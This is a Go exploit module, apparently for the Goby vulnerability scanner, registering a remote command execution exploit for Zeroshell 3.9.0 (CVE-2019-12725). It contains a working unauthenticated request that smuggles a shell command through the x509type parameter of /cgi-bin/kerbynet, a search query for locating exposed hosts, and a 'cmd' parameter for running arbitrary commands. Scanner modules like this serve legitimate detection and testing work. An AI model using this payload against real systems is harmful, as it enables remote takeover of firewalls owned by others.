package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zeroshell 3.9.0 kerbynet RCE (cve-2019-12725)",
    "Description": "Command Execution Vulnerability exists in zeroshell 3.9.0, /cgi-bin/kerbynet page, and the filtering of x509type parameter is not strict, resulting in the attacker can execute arbitrary commands.",
    "Impact": "Zeroshell 3.9.0 kerbynet RCE (cve-2019-12725)",
    "Recommendation": "<p>undefined</p>",
    "Product": "Zeroshell-Firewall",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "Zeroshell 远程代码执行漏洞",
            "Description": "zeroshell 3.9.0、/cgi-bin/kerbynet中存在命令执行漏洞，对x509type参数的过滤不严格，导致攻击者可以执行任意命令。",
            "Impact": "<p>黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</p>",
            "Recommendation": "<p>1. 严格过滤用户输入的数据，禁止执行系统命令。<br>2.&nbsp;去厂商官网下载更新至最新稳定版本：<a href=\"https://zeroshell.org/\" rel=\"nofollow\">https://zeroshell.org/</a></p>",
            "Product": "Zeroshell-防火墙",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Zeroshell 3.9.0 kerbynet RCE (cve-2019-12725)",
            "Description": "Command Execution Vulnerability exists in zeroshell 3.9.0, /cgi-bin/kerbynet page, and the filtering of x509type parameter is not strict, resulting in the attacker can execute arbitrary commands.",
            "Impact": "Zeroshell 3.9.0 kerbynet RCE (cve-2019-12725)",
            "Recommendation": "<p>undefined</p>",
            "Product": "Zeroshell-Firewall",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "(title=\"ZeroShell\" || cert=\"ZeroShell\")",
    "GobyQuery": "(title=\"ZeroShell\" || cert=\"ZeroShell\")",
    "Author": "go0p",
    "Homepage": "https://zeroshell.org",
    "DisclosureDate": "2021-05-17",
    "References": [
        "https://zeroshell.org/new-release-and-critical-vulnerability/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-12725"
    ],
    "CNVD": [
        "CNVD-2019-26785"
    ],
    "CNNVD": [
        "CNNVD-201907-1141"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aecho%204034cbcd719230%27%27b549c83e588cec8923%0A%27",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "4034cbcd719230b549c83e588cec8923",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aecho%204034cbcd719230%27%27b549c83e588cec8923%0A%27",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "4034cbcd719230b549c83e588cec8923",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Zeroshell-Firewall"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
